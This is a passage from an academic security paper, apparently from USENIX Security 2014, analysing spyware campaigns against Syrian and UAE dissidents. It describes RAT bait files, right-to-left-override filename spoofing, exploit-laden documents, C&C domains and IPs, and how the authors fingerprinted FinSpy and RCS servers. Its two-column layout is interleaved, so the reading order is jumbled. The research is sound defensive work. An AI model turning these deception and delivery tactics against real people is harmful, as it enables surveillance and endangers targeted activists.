ing to these, the e-mails received by the targets all came from             the target to execute the file or click the link.
fatoomah85@gmail.com. A link sent in one of these e-                            The first attacks in Figure 3 date to 2012, and use bait files
mails was connected to the al9mood bit.ly account.                          with a DarkComet RAT payload. These attacks share the same
   In monitoring accounts connected to al9mood, we counted                  C&C, 216.6.0.28, a Syrian IP address belonging to the Syr-
more than 200 IP spy links in Twitter messages and public                   ian Telecommunications Establishment, and publicly reported
Facebook posts. Attackers often used (1) accounts of promi-                 as a C&C of Syrian malware since February 2012 [45]. The
nent or trusted but jailed individuals like 
Red Sky,
 (2) fake             first bait file presents to the victim as a PDF containing infor-
personas (e.g., attractive women or fake job seekers when tar-              mation about a planned uprising in Aleppo. In fact the file is a
geting a labor union), or (3) impersonations of legitimate ac-              Windows Screensaver (.scr) that masquerades as a PDF using
counts. In one particularly clever tactic, attackers exploited              Unicode RLO, rendering a name such as 
.fdp.scr
 dis-
Twitter
s default font, for example substituting a lowercase 
            play to the victim as 
.rcs.pdf.
 The second bait file is
with an uppercase 
 or switching vowels (e.g. from 
 to                 a dummy program containing DarkComet while masquerading
) to create at-a-glance identical usernames. In addition,             as a Skype call encryption program, playing to opposition para-
malicious accounts tended to quickly delete IP spy tweets sent              noia about government backdoors in common software. The
via (public) mentions, and frequently change profile names.                 third attack in Figure 3, observed in October 2013, entices tar-
                                                                            gets with e-mails purporting to contain or link to videos about
                                                                            the current conflict, infecting victims with Xtreme RAT, and
4.2     Syria                                                               using the C&C tn1.linkpc.net.
The use of RATs against the opposition has been a well-                         For seeding, the attackers typically use compromised ac-
documented feature of the Syrian Civil War since the first re-              counts (including those of arrested individuals) or fake iden-
ports were published in early 2012 [36, 39, 40, 32, 34]. The                tities masquerading as pro-opposition. Our illustration shows
phenomenon is widespread, and in our experience, most mem-                  in abstract terms the use of Victim A
s account to seed mal-
bers of the opposition know that some hacking is taking place.              ware (
Aleppo Plan
) via (say) Skype messages to Victim(s)
As summarized in Table 3, the attacks often include fake or ma-             Bn .     In the cases of Opp. Member C and NGO Worker
liciously packaged security tools; intriguing, or ideological, or           D (here, actual victims, not abstract), targeting was by e-mail
movement-relevant content (e.g. lists of wanted persons). The               from domains apparently belonging to opposition groups, in-
seeding techniques and bait files suggest a good understanding              dicating a potential compromise. One domain remains active,
of the opposition
s needs, fears and behavior, coupled with ba-             hosting a website of the Salafist Al-Nusra front [46], while the
sic familiarity with off-the-shelf RATs. In some cases attacks              other appears dormant. Opp. Member C received a malicious
occur in a context that points to a more direct connection to               file as an e-mail attachment, while NGO Worker D was sent a
one of the belligerents: the Syrian opposition has regularly ob-            shortened link (url[.]no/Uu5) to a download from a directory
served that detainees
 accounts begin seeding malware shortly               of Mrconstrucciones[.]net,7 a site that may have been com-
after their arrest by government forces [41].                               promised. Both attacks resulted in an Xtreme RAT infection.
   Researchers and security professionals have already profiled                 Interestingly, in the case of the fake Skype encryption
many of these RATs, including DarkComet [42, 43], Black-                    the deception extended to a YouTube video from 
IT Se-
shades Remote Controller [38], Xtreme RAT [44], njRAT [26],                 curity Lab
 [47] demonstrating the program
s purported ca-
and ShadowTech [36]. Some are available for purchase by any-                pabilities, as well as a website promoting the tool, skype-
one, in contrast to 
government only
 FinSpy and RCS. For ex-               encryption.sytes.net. The attackers also constructed a ba-
ample, Xtreme RAT retails for e350, while a version of Black-               sic, faux GUI for their 
Encryption
 program (see Figure 4).
shades lists for e40. Others, like DarkComet, are free. We                  The fake GUI has a number of non-functional buttons like 
have also observed cracked versions of these RATs on Arabic-                crypt
 and 
DeCrypt,
 which generate fake prompts. While dis-
language hacker forums, making them available with little ef-               tracted by this meaningless interaction, the victim
s machine is
fort and no payment trail. While the RATs are cheaper and less              infected with DarkComet 3.3 [32, 33].
                                                                                Anecdotally, campaign volume appears to track significant
  6 YahooMail and the iPhone mail client automatically load these re-
mote images, especially in e-mails spoofed from trusted senders.               7 Obfuscated   to avoid accidental clicks on active malware URLs.
                                                                        6
 23rd USENIX Security Symposium
                                                                                       USENIX Association
 Type                     Features                                                                     Examples (RATs)
 Security tools           Executable files presented as a 
tool
 often accompanied by justifica-       
Skype Encryption
 (DC) [32, 33], 
Facebook Security
 (cus-
                          tions or statements of its value in the targeted seeding, for example on     tom) [34], Anti-hacker (DC) [35], Fake Freegate VPN (ST) [36]
                          a social media site, at the download location, or in videos
 Ideologically   or       A document or PE as download or attachment with accompanying en-             
Names of individuals wanted by the Regime,
 (DC) 
Aleppo
 movement-relevant        couragement to open or act on the material, often masquerading as            [uprising] Plan
 (DC) [37], important video (BS) [38], 
Hama
 files                    legitimate PDF documents or inadvertently leaked regime programs.            Rebels Council
 document (DC) [39], 
wanted persons
                          Frequent use of RLO to disguise true extension (such as .exe or              database frontend (custom), movement relevant video (njRAT),
                          .scr)                                                                        file about the Free Syrian Army (Xtreme RAT)
 Miscellaneous tools      Tools pretending to offer functionality relevant to the opposition, such     hack facebook pro v6.9 (DC) [40]
                          as a fake tool claiming to 
mass report
 regime pages on Facebook
Table 3: Campaigns and RATs employed in Syrian surveillance. BS = Blackshades, DC = DarkComet, ST = Shad-
owTech.
                                                                             
Skype
                       SY Malware      tn1.linkpc.net   skype-encription    Encryption
    Xtreme Rat       Mrconstrucciones.net      Url.no
                         Actors                            .sytes.net
                                                                                                     fsa@freesyria.com mohamed@jalnosra.com
                                         216.6.0.28                                  fsa.zip
                                                                                       Dark Comet
                         SY Gov't                              Account seeds
                                                               
Aleppo Plan
                                                                                                          E-Mail                E-Mail
                       Victim A                  Credentials
                                    Arrested
                                                   gained
                                                                                    
Aleppo Plan
                                  Victim(s) Bn    Clicks                                              Opp. Member C         NGO Worker D
                                                   file        Account seeds
                                                               
Aleppo Plan
                                  Figure 3: A sample from the ecosystem of Syrian malware campaigns.
events in the ongoing conflict. For example, campaigns dwin-
dled and then rebounded within hours after Syria
s 2012 Inter-
net shutdown [48]. Similarly, activity observed by the authors
also dwindled prior to expectation of US-led military action
against Syrian government targets in September 2013. Once
this option appeared to be off the table, the volume of new
samples and campaigns we observed again increased, includ-
ing the recent targeting of NGO workers per Figure 3. We are
aware of only a negligible number of cases of the opposition
using similar RATs against Syrian Government supporters, al-
though evidence exists of other kinds of electronic attacks by
third parties.
Real world consequences. The logistics and activities of
Syria
s numerous opposition groups are intentionally concealed
from public view to protect both their efficacy, and the lives of
people participating in them. Nevertheless, Syrian opposition
members are generally familiar with stories off digital compro-                         Figure 4: The fake Skype program distracts the victim
mises of high-profile figures, including those entrusted with the                       with the promise of encrypted communications while in-
most sensitive roles, as well as rank-and-file members. Com-                            fecting their machine with DarkComet.
promise of operational security poses a documented threat to
life both for victims of electronic compromise, and to family
members and associates.
   The Syrian conflict is ongoing, making it difficult to assem-
                                                                                   7
USENIX Association 
                                                                                               23rd USENIX Security Symposium
 517
ble comprehensive evidence of linkages between government                      UAE Gov't         HackingTeam            3-Stage
                                                                                                                       Exploit Kit
actors and malware campaigns. Moreover, many individuals                                                                                 owner.no-ip.biz
whose identities have been compromised are in prison or oth-
erwise disappeared, and thus unable to relate the evidence pre-                            CVE-2010-3333
sented to them during interrogation. Still, strong circumstantial
evidence links the use of RATs, phishing, and government ac-
                                                                                                                 
wikileaks
         Xtreme RAT
tivity, which we briefly summarize here: (1) many Syrians have                             RCS                 
veryimportant
recounted to journalists and the authors how interrogators con-
fronted them with material from their computers. For example:
      The policeman told me, 
Do you remember when
      you were talking to your friend and you told him
      you had something wrong [sic] and paid a lot of                                                    Author
      money? At that time we were taking information                              ar-24.com                                Communicated
                                                                                                                             via E-Mail
      from your laptop.
 [41]
(2) Syrian activists have supplied cases to international journal-
ists [41], where arrests are quickly followed by the social me-                  Ahmed
                                                                                               Laptop
                                                                                              infected
dia accounts of detained individuals seeding malware to contact                                                 E-Mail account
lists (Figure 3). (3) Finally, despite the notoriety of the attack                                              compromised
campaigns, including mention of C&C IPs in international me-
dia [45], the Syrian government has made no public statements
about these campaigns nor acted to shut down the servers.                Figure 5: Part of the ecosystem of UAE surveillance at-
    Beyond the ongoing challenges of attribution, these malware          tacks.
campaigns have a tangible impact on the Syrian opposition, and
generally align with the interests of the Syrian government
s            from ar-24.com, which in turn downloaded spyware from
propaganda operations. The case of Abdul Razzaq Tlass, a                 ar-24.com. We denote this combination as the 3-Stage Ex-
leader in the Free Syrian Army, is illustrative of the potential         ploit Kit in Figure 5.
uses of such campaigns. In 2012 a string of videos emerged                  The C&C server also ran on ar-24.com. When we ob-
showing Tlass sexting and engaged in lewd activity in front of           tained the sample in July 2012, ar-24.com resolved to an
a webcam [49]. While he denied the videos, the harm to his rep-          IP address on Linode, a hosting provider. Three months later, it
utation was substantial and he was eventually replaced [50].             resolved to a UAE address belonging to the Royal Group [52],
                                                                         an organization linked to the UAE government; it is chaired by
                                                                         Sheikh Tahnoon bin Zayed Al-Nayhan, a member of the UAE
4.3    UAE
                                                                         ruling family and a son of the founder of the UAE.
While the UAE has experienced no recent uprising or politi-                 Identification as RCS: We identified strings in memory
cal unrest, it has nevertheless cracked down on its opposition,          that matched those in a Symantec analysis [53] of RCS (also
concurrent with the Arab Spring.                                         known as DaVinci or Crisis), a product of the Italian com-
   The first attacks we observed in the UAE involved a                   pany Hacking Team [54]. We also located a structurally sim-
government-grade 
lawful interception
 trojan known as Re-               ilar Word document via VirusTotal. The document used the
mote Control System (RCS), sold by the Italian company Hack-             same exploit and attempted to download a second stage from
ing Team. The associated C&C server indicated direct UAE                 rcs-demo.hackingteam.it, which was unavailable at
government involvement. Over time, we stopped receiving                  the time of testing.
RCS samples from UAE targets, and instead observed a shift                  Analysis of capabilities: RCS has a suite of functionality
to the use of off-the-shelf RATs, and possible involvement of            largely similar to FinSpy. One difference was in the vectors
cyber-mercenary groups. However, poor attacker operational               used to install the spyware. We located additional samples (see
security allowed us to link most observed attacks together.              
 5), some of which were embedded in a .jar file that installs
                                                                         an OS-appropriate version of RCS (Windows or OSX), option-
RCS. UAE activist Ahmed Mansoor (per Figure 5), impris-                  ally using an exploit. If embedded as an applet, and no exploit
oned from April to November 2011 after signing an online pro-            is present, Java displays a security warning and asks the user
democracy petition [51], received an e-mail purportedly from             whether they authorize the installation. We also saw instances
Arabic Wikileaks
 in July 2012. He opened the associated at-            of the 3-Stage Exploit Kit where the first stage contained a
tachment, 
veryimportant.doc,
 and saw what he described as              Flash exploit; in some cases, we could obtain all stages and
scrambled letters
. He forwarded us the e-mail for investiga-           confirm that these installed RCS. Some samples were packed
tion.                                                                    with the MPress packer [55], and some Windows samples were
   The attachment exploited CVE-2010-3333, an RTF pars-                  obfuscated to look like the PuTTY SSH client.
ing vulnerability in Microsoft Office. The document did not                 Another difference is in persistence. For example, the RCS
contain any bait content, and part of the malformed RTF                  sample sent to Ahmed adds a Run registry key, whereas the
that triggered the exploit was displayed in the document.                FinSpy samples used in Bahrain overwrite the hard disk
s boot
The exploit loaded shellcode that downloaded a second stage              sector to modify the boot process; the spyware is loaded be-
                                                                     8
 23rd USENIX Security Symposium
                                                                                                 USENIX Association
fore the OS, and injects itself into OS processes as they start.                    faddeha.com              hamas.sytes.net     dreems.no-ip.ca
The RCS samples we examined also had the ability to propa-
                                                                                                Hosts sample that          Same IP            SameIP1
gate to other devices, including into inactive VMWare virtual                                     talks to C&C
machines by modifying the disk image, onto USB flash drives,
                                                                                                   CVE-2013-0422
and onto Windows Mobile phones. We did not observe similar                                                           Used by sample
                                                                                                                    that talks to C&C
capabilities in the FinSpy samples we examined.                                Journalist A,
                                                                              H.R. activist B    njq8
                                                                                                                                          Journalist F
   Exploitation of captured data: When Ahmed Mansoor re-
ceived the RCS document, he opened it, infecting his computer                  njRAT                           VB Packer                   upload.bz
(Figure 5). Ahmed subsequently noted several suspicious ac-                               storge.myftp.org
cesses to his GMail account using IMAP. Even after he changed
his password, the accesses continued. While corresponding
with Ahmed on his compromised account, an author of this pa-
per discovered that the attackers had installed an application-
specific password [56] in Ahmed
s GMail account, a secondary                            Relative of                                  SpyNet
                                                                                   political detainee D
password that they apparently used to access his account even
after he changed his main password. The suspicious accesses                        Journalist C
stopped after removal of the application-specific password.
   Two weeks after this correspondence with Ahmed, one of us
(Author in Figure 5) received a targeted e-mail with a link to                                    H.R. activist E
a file hosted on Google Docs containing a commercial off-the-                   SameIP1
shelf RAT, Xtreme RAT. The e-mail was sent from the UAE
timezone (as well as of other countries) and contained the terms                 sn.all-google.com           DarkComet      Appin       CVE 2012-0158
veryimportant
 and 
wikileaks
, just like in the e-mail re-
ceived by Ahmed.
   The instance of Xtreme RAT sent to Author used                       Figure 6: Another part of the ecosystem of UAE surveil-
owner.no-ip.biz for its C&C, one of the domains men-                    lance attacks.
tioned in a report published by Norman about a year-long cam-
paign of cyberattacks on Israeli and Palestinian targets carried
out by a group that Norman was unable to identify [57]. Three           Off-the-shelf RATs. We found a file that VirusTotal had
months after Author was targeted, Ahmed received an e-mail              downloaded from faddeha.com, which appeared to be a re-
containing an attachment with Xtreme RAT that talked to the             mote access toolkit known as SpyNet, available for general pur-
same C&C server (Figure 5), suggesting that the attackers who           chase for 50 Euros [60]. The SpyNet sample communicated
infected Ahmed with RCS may have provided a list of interest-           with the C&C hamas.sytes.net.
ing e-mail addresses to another group for further targeting.               SpyNet Packing: We found another instance of the first
                                                                        stage of the 3-Stage Exploit Kit on VirusTotal. The exploit
   Possible consequences: Shortly after he was targeted,                downloaded a second stage, which in turn downloaded a sam-
Ahmed says he was physically assaulted twice by an attacker             ple of SpyNet from maile-s.com. This sample of SpyNet
who appeared able to track Ahmed
s location [58]. He also re-           communicated with the same C&C hamas.sytes.net.
ports that his car was stolen, a large sum of money disappeared         The sample was packed using ASProtect [61]. When run, the
from his bank account, and his passport was confiscated [59].           sample unpacks a compiled Visual Basic project that loads, via
He believes these consequences are part of a government in-             the RunPE method [62], an executable packed with UPX [63].
timidation campaign against him, but we did not uncover any             Finally, this executable unpacks SpyNet. SpyNet
s GUI only
direct links to his infection. (Interestingly, spyware subse-           offers an option to pack with UPX, suggesting that the attack-
quently sent to others has used bait content about Ahmed.)              ers specially added the other layers of packing. In some cases,
   Further attacks: In October 2012, UAE Journalist A and               the Visual Basic project bears the name NoWayTech, which
Human Rights activist B (per Figure 6) forwarded us suspi-              appears to be an underground RunPE tool, while others are
cious e-mails they had received that contained a Word docu-             named SpyVisual, which we have been unable to trace to any
ment corresponding to the first stage of 3-Stage Exploit Kit            public underground tools, and thus also may reflect customiza-
(Figure 5). The attachment contained an embedded Flash file             tion by the attacker. The SpyVisual projects contain the string
that exploited a vulnerability fixed in Adobe Flash 11.4, loading       c:\Users\Zain\AppData\Local\Temp\OLE1EmbedStrm.wav,
shell code to download a second stage from faddeha.com.                 which we used as the fingerprint VB Packer in Figure 6.
We were unable to obtain the second stage or the ultimate pay-             Cedar Key attack: The same VB Packer was used in an
load, as the website was unavailable at the time of testing.            attack on Relative of political detainee D and H.R. activist
However, the exploit kit appears indicative of Hacking Team             E in Figure 6. These individuals received e-mails containing a
involvement. A page on faddeha.com found in Google
s                    link to a web page hosted on cedarkeyrv.com impersonat-
cache contained an embedded .jar with the same applet class             ing YouTube. Loading the page greeted the target with 
Video
(WebEnhancer) as those observed in other .jar files that we             loading please wait . . .
 The page redirected to a YouTube
found to contain RCS.                                                   video a few seconds later, but first loaded a Java exploit [64]
                                                                    9
USENIX Association 
                                                                                 23rd USENIX Security Symposium
 519
known vulnerability with no patch at the time that the e-mails           servers to develop indicators (fingerprints) for how the servers
were sent. Oracle released a patch 12 hours after activists began        respond to certain types of requests. We then scanned the full
receiving these links.                                                   Internet IPv4 address space (
) for these, along with prob-
   The cedarkeyrv.com domain is associated with an RV                    ing results found by past scans. In many cases we do not release
park in Cedar Key, Florida. The website
s hosting company                the full details of our fingerprints to avoid compromising what
told us that the site had apparently suffered a compromise, but          may be legitimate investigations.
did not have further details.
   The exploit used in the attack appears to have been origi-
                                                                         5.1    FinSpy
nally posted by a Kuwaiti user, njq8, on an Arabic-language
exploit sharing site [65]. We contacted njq8, who told us                Identifying and linking servers: We developed a number
that he had obtained the exploit elsewhere and modified it               of fingerprints for identifying FinSpy servers using HTTP-
prior to posting. The attack downloaded an instance of                   based probing as well as FinSpy
s custom TLV-based proto-
SpyNet from isteeler.com (which from our inspection did                  col. We leveraged quirks such as specific non-compliance
not appear to have any legitimate content), which used the               with RFC 2616, responses to certain types of invalid data,
C&C storge.myftp.org. This same C&C occurred in an-                      and the presence of signatures such as the bizarre 
Hallo
other attack (Figure 6) targeting Relative of political detainee         Steffi
 that Guarnieri identified from Bahraini FinSpy C&C
D; in that case, the payload was a freely-available RAT known            servers [67, 68]. See Appendix A for details. We then exhaus-
as njRAT, written by the same njq8 as the exploit-poster dis-            tively scanned the Internet looking for matches to these finger-
cussed above. However, we did not find any other evidence                prints.
suggesting njq8
s involvement in either attack.                             Gamma documentation advertises that an operator of FinSpy
   More SpyNet attacks: The domain hamas.sytes.net,                      can obscure the location of the C&C server (called the mas-
which we previously saw used by two SpyNet sam-                          ter) by setting up a proxy known as a relay. In Spring 2013
ples, resolved to 67.205.79.177.                    Historically,        we noticed FinSpy servers now issuing 302 Redirects to
dreems.no-ip.ca also resolved to this address. An                        google.com. However, we noticed anomalies: for ex-
unidentified dropper using this C&C targeted Journalist F; a             ample, servers in India were redirecting to the Latvian ver-
SpyNet attack on Relative of political detainee D also used              sion of Google google.lv. We suspect that the server
this C&C. In that latter case, the sample arrived via e-mail             in India was a relay forwarding to a master in Latvia. Be-
in a .rar attachment that contained an .scr file disguised               cause the master served as a proxy for Google, we could
as a Word document. The .scr file was a self-extracting                  uncover its IP address using a Google feature that prints a
archive that decompressed and ran both the bait document                 user
s IP address for the query 
IP address.
 We created an
and the payload. The SMTP source of the e-mail was                       additional fingerprint based on the proxying behavior and is-
webmail.upload.bz.                                                       sued GET /search?q=ip+address&nord=1 requests to
   Appin: In early 2013 UAE H.R. activist E forwarded nu-                servers We note some interesting master locations in Table 4.
merous documents that included a particular CVE-2012-0158                   Server locations: In all, our fingerprints matched 92 dis-
exploit for Microsoft Word. In all, these totaled 17 distinct            tinct IP addresses in 35 different countries. Probing these on
hashes of documents, and 10 distinct hashes of payloads (some            8/8/13 revealed 22 distinct addresses still responding, sited
documents that differed in their hash downloaded the same pay-           in: Bahrain, Bangladesh, Bosnia and Herzegovina, Estonia,
load). The exploits primarily downloaded instances of SpyNet             Ethiopia, Germany, Hong Kong, Indonesia, Macedonia, Mex-
from upload.bz, which for the most part communicated                     ico, Romania, Serbia, Turkmenistan, and the United States. We
with C&C at sn.all-google.com. This domain was also                      found servers responding to a number of our fingerprints, sug-
used for C&C in other attacks, including that on Journalist C.           gesting either that some servers lag in their updates, or a con-
   Two of the other CVE-2012-0158 exploits down-                         certed effort to vary the behavior of FinSpy servers to make
loaded DarkComet from www.getmedia.us and                                detection harder.
www.technopenta.com after posting system infor-                             We found: (1) 3 IP addresses in ranges registered to Gamma.
mation to random123.site11.com. All three domains                        (2) Servers in 3 IP ranges explicitly registered to govern-
match those used by an Indian cybermercenary group said                  ment agencies: Turkmenistan
s Ministry of Communications,
to be linked to Appin Security Group [66].           The former          Qatar
s State Security Bureau, and the Bulgarian Council of
two domains hosted content other than spyware (i.e., they                Ministers. (3) 3 additional IP addresses in Bahrain, all in
may have been compromised). We alerted the owner of                      Batelco. (4) Servers in 7 countries with governments classified
www.getmedia.us, who removed the payloads.                               as 
authoritarian regimes
 by The Economist [69]: Bahrain,
                                                                         Ethiopia, Nigeria, Qatar, Turkmenistan, UAE, Vietnam.
                                                                            Additional FinSpy samples: In parallel to our scanning,
5    Empirical characterization                                          we obtained 9 samples of FinSpy by writing YARA [70] rules
                                                                         for the 
malware hunting
 feature of VirusTotal Intelligence.
The samples we received afforded us an opportunity to em-                This feature sends us all newly-submitted samples that match
pirically characterize the use of FinFisher and Hacking Team             our signatures. We located a version of FinSpy that does not
around the world, enabling us to assess their prevalence, and            use the normal FinSpy handshake, but instead uses a protocol
identify other country cases that may warrant future investiga-          based on HTTP POST requests for communication with the
tion. We analyzed the samples and the behavior of their C&C              C&C server. This did not appear to be an older or newer ver-
                                                                    10
 23rd USENIX Security Symposium
                                                                               USENIX Association
      Relay IP             Relay Block Assignment    Relay Country    Master IP               Master Block Assignment    Master Country
      5.199.xxx.xxx        SynWebHost                Lithuania        188.219.xxx.xx          Vodafone                   Italy
      46.23.xxx.xxx        UK2 VPS.net               UK               78.100.xxx.xxx          State Security Building    Qatar
      119.18.xxx.xxx       HostGator                 India            81.198.xxx.xxx          Statoil DSL                Latvia
      180.235.xxx.xxx      Asia Web Services         Hong Kong        80.95.xxx.xxx           T-Systems                  Czech Republic
      182.54.xxx.xxx       GPLHost                   Australia        180.250.xxx.xxx         PT Telekom                 Indonesia
      206.190.xxx.xxx      WestHost                  USA              112.78.xxx.xxx          Biznet ISP                 Indonesia
      206.190.xxx.xxx      Softlayer                 USA              197.156.xxx.xxx         Ethio Telecom              Ethiopia
      209.59.xxx.xxx       Endurance International   USA              59.167.xxx.xxx          Internode                  Australia
      209.59.xxx.xxx       Endurance International   USA              212.166.xxx.xxx         Vodafone                   Spain
       Table 4: Deproxifying FinSpy (mapping initial C&C IP addresses to the masters to which they forward).
sion of the protocol, suggesting that our scan results may not                  Country            IPs             Provider           IPs
reveal the full scope of FinSpy C&C servers. Perhaps, the                     United States         61              Linode             42
HTTP POST protocol was only delivered to a specific Gamma                    United Kingdom         18            NOC4Hosts            16
customer to meet a requirement.                                                    Italy            16           Telecom Italia         9
                                                                                  Japan             10           Maroc Telecom          7
                                                                                Morocco              7             InfoLink             6
5.2    Remote Control System (RCS)
We began by analyzing the UAE RCS sample from Ahmed and
                                                                          Table 5: Top countries and hosting providers for RCS
6 samples obtained from VirusTotal by searching for AV re-
                                                                          servers active on 11/4/13.
sults containing the strings 
DaVinci
 and 
RCS.
 At the time,
several AV vendors had added detection for RCS based on a
sample analyzed by Dr. Web [71] and the UAE RCS sample                    ing one of our fingerprints in 29 different countries. We sum-
sent to Ahmed. We also similarly obtained and analyzed sam-               marize the top providers and countries in Table 5.
ples of FSBSpy [72], a piece of malware that can report system               The prevalence of active servers either located in the USA or
information, upload screenshots, and drop and execute more                hosted by Linode is striking,8 and seems to indicate a pervasive
malware, Based on these samples, we devised YARA signa-                   use of out-of-country web hosting and VPS services.
tures that yielded 23 additional samples of structurally similar             In addition, we found: (1) 3 IP addresses on a /28 named
malware.                                                                  
HT public subnet
 that is registered to the CFO of Hacking
    Fingerprints: We probed the C&C servers of the RCS and                Team [76]. The domain hackingteam.it resolves to an
FSBSpy samples, and found that they responded in a distinc-               address in this range. (2) An address belonging to Omantel, a
tive way to HTTP requests, and returned distinctive SSL cer-              majority-state-owned telecom in Oman. This address was un-
tificates.                                                                reachable when we probed it; a researcher pointed us to an FS-
                                                                          BSpy sample that contained an Arabic-language bait document
    We searched sources including Shodan, 5 Internet Census
                                                                          about Omani poetry, which talked to a C&C in the UK. (3) 7
service probes [73], and Critical.IO scanning data [68] for the
                                                                          IP addresses belonging to Maroc Telecom. Moroccan journal-
observed distinctive HTTP behavior. We searched for the dis-
                                                                          ists at Mamfakinch.com were previously targeted by RCS in
tinctive SSL certificates in two Internet Census service probes,
                                                                          2012 [77]. (4) Overall, servers in 8 countries with governments
and SSL certificate scans from ZMap [74]. We also contacted a
                                                                          deemed 
authoritarian regimes
 [69]: Azerbaijan, Kazakhstan,
team at TU Munich [75], who applied our fingerprints to their
                                                                          Nigeria, Oman, Saudi Arabia, Sudan, UAE, Uzbekistan.
SSL scanning data. Across all of these sources, we obtained
                                                                             Link to Hacking Team: All active servers match-
31,345 indicator hits reflecting 555 IP addresses in 48 coun-
                                                                          ing one of our signatures also responded peculiarly when
tries.
                                                                          queried with particular ill-formed HTTP requests, respond-
    One SSL certificate returned by 175 of the servers was issued
                                                                          ing with 
HTTP1/1 400 Bad request
 (should be
/CN=RCS Certification Authority /O=HT srl,
 apparently
                                                                          
HTTP/1.1
) and a body of 
Detected error: HTTP
referring to the name of the spyware and the company. Servers
                                                                          code 400
. Googling for this response yielded a GitHub
for 5 of our FSBSpy samples and 2 of our RCS samples re-
                                                                          project em-http-server [78], a Ruby-based webserver.
sponded with this type of certificate.
                                                                          The project
s author is listed as Alberto Ornaghi, a software
    Some servers returned these certificates in chains that in-
                                                                          architect at Hacking Team. We suspect that the Hacking Team
cluded another distinctive certificate. We found 175 distinct IP
                                                                          C&C server code may incorporate code from this project.
addresses (including the C&C
s for 5 of our FSBSpy samples
                                                                             Links between servers: We identified many cases where
and 2 of our RCS samples) responded with this second type of
                                                                          several servers hosted by different providers, and in different
certificate.
                                                                          countries, returned identical SSL certificates matching our fin-
    We devised two more indicators: one that matched 125 IP
                                                                          gerprints. We also observed 30 active servers used a global
addresses, including 7 of our FSBSpy samples
 C&C
s, and
                                                                          IPID. Only one active server had neither a global IPID nor
one that matched 2 IP addresses, in Italy and Kazakhstan.
    Server locations: On 11/4/13 we probed all of the IP ad-                  8 19 of the 42 Linode servers were hosted in the USA, so the two
dresses that we collected, finding 166 active addresses match-            patterns of prevalence are mostly distinct.
                                                                     11
USENIX Association 
                                                                            23rd USENIX Security Symposium
 521
an SSL certificate matching our fingerprints. We assessed                  ing 11 cases in which they appeared to be used in countries
whether servers returning SSL certificates were forwarding to              governed by 
authoritarian regimes.
the servers with global IPIDs by inducing bursts of traffic at the             We aim with this work to inspire additional research efforts
former and monitoring the IPID at the latter. For 11 servers,              addressing the difficult problem of how to adequately protect
we found that the server
s activity correlated to bursts sent to           individuals with very limited resources facing very powerful
other servers We grouped servers by the SSL certificates they              adversaries. Open questions include robust, practical detection
returned, and found that each group forwarded to only a sin-               of targeted attacks designed to exfiltrate data from a victim
gle server, except for one case where a group forwarded to two             computer, as well as detection of and defense against novel at-
different IPs (both in Morocco). We also found two groups                  tack vectors, like tampering with Internet connections to insert
that forwarded to the same address. There was a 1:1 mapping                malware.
between the remaining 8 addresses and groups. We refer to a                    The task is highly challenging, but the potential stakes are
group along with the server(s) it forwards to as a server group.           likewise very high. An opposition member, reflecting on gov-
We identified several server groups that may be associated with            ernment hacking in Libya, speculated as to why some users
victims or operators in a certain country. Some of these suggest           would execute files even while recognizing them as potentially
possible further investigation:                                            malicious [2]: 
If we were vulnerable we couldn
t care less . . .
   Turkey: We identified a group containing 20 servers in 9                we were desperate to get our voices out . . . it was a matter of
countries. Two RCS and 5 FSBSpy samples from VirusTo-                      life or death . . . it was just vital to get this information out.
tal communicated with various servers in the group. The RCS
samples also communicated with domains with lapsed registra-
                                                                           Acknowledgment
tions, so we registered them to observe incoming traffic. We ex-
clusively received RCS traffic from Turkish IP addresses. (RCS             This work was supported by the National Science Foundation
traffic is identifiable based on a distinctive user agent and URL          under grants 1223717 and 1237265, and by a Citizen Lab Fel-
in POST requests.) A sample of FSBSpy apparently installed                 lowship. Any opinions, findings, and conclusions or recom-
from an exploit on a Turkish server talked to one of the servers           mendations expressed in this material are those of the authors
in this group.[79]                                                         and do not necessarily reflect the views of the sponsors.
   We also found server groups containing servers in Uzbek-                   The authors would like to thank the following individuals
istan and Kazakhstan; we found FSBSpy samples on Virus-                    for their help in various aspects of our analysis: Bernhard Am-
Total uploaded from these countries that communicated with                 man, Collin D. Anderson, Brandon Dixon, Zakir Durumeric,
servers in these groups.                                                   Eva Galperin, Claudio Guarnieri, Drew Hintz, Ralph Holz,
   In the above cases, save Turkey, the country we have identi-            Shane Huntley, Andrew Lyons, Mark Schloesser, and Nicholas
fied is classified as an 
authoritarian regime,
 and may be using          Weaver.
Hacking Team products against the types of targets we profile
in this paper. In the case of Turkey, there are hints that the tool
may be employed against dissidents [80].                                   References
                                                                            [1] 
Dark Secrets
Hacking Team commercial,
 ac-
                                                                                cessed:       12-November-2013. [Online]. Available:
6    Summary
                                                                                http://bit.ly/1bCh57v
Targeted surveillance of individuals conducted by nation-states             [2] J. Scott-Railton, 
Revolutionary Risks: Cyber Technol-
poses an exceptionally challenging security problem, given the                  ogy and Threats in the 2011 Libyan Revolution,
great imbalance of resources and expertise between the victims                  Naval War College, Tech. Rep., 2013.
and the attackers. We have sketched the nature of this problem              [3] S. H. AlJalahma, 
Response to The Guardian
space as reported to us by targeted individuals in three Middle                 companys software used against Bahrain activist,
 May
Eastern countries. The attacks include spyware for ongoing                      2013, accessed: 12-November-2013. [Online]. Available:
monitoring and the use of 
IP spy
 links to deanonymize those                   http://bit.ly/19iVUUP
who voice dissent.                                                          [4] V. Silver, 
Gamma Says No Spyware Sold to
    The attacks, while sometimes incorporating effective so-                    Bahrain; May Be Stolen Copy,
 Jul. 2012, ac-
cial engineering, in general lack novel technical elements. In-                 cessed:     12-November-2013. [Online]. Available:
stead, they employ prepackaged tools developed by vendors                       http://bloom.bg/17SOXQs
or acquired from the cybercrime underground. This technol-
                                                                            [5] A. Jeffries, 
Meet Hacking Team, the company that helps
ogy sometimes suffers from what strike us as amateurish mis-
                                                                                the police hack you,
 Sep. 2013, accessed: 12-November-
takes (multiple serious errors implementing cryptography, bro-
                                                                                2013. [Online]. Available: http://bit.ly/1bCajyl
ken protocol messages), as does the attackers
 employment of
it (identifying-information embedded in binaries, C&C servers               [6] T. Brewster, 
From Bahrain To Belarus: Attack Of The
discoverable via scanning or 
Google hacking
, clusters of at-                  Fake Activists,
 Jul. 2013, accessed: 12-November-2013.
tack accounts tied by common activity). Some of these errors                    [Online]. Available: http://bit.ly/1gIgwhW
assisted our efforts to assemble strong circumstantial evidence             [7] V. Silver, 
MJM as Personified Evil Says Spyware Saves
of governmental origins. In addition, we mapped out the global                  Lives Not Kills Them,
 2011, accessed: 12-November-
use of two 
governmental
 hacking suites, including identify-                   2013. [Online]. Available: http://bloom.bg/170E8sQ
                                                                      12
 23rd USENIX Security Symposium
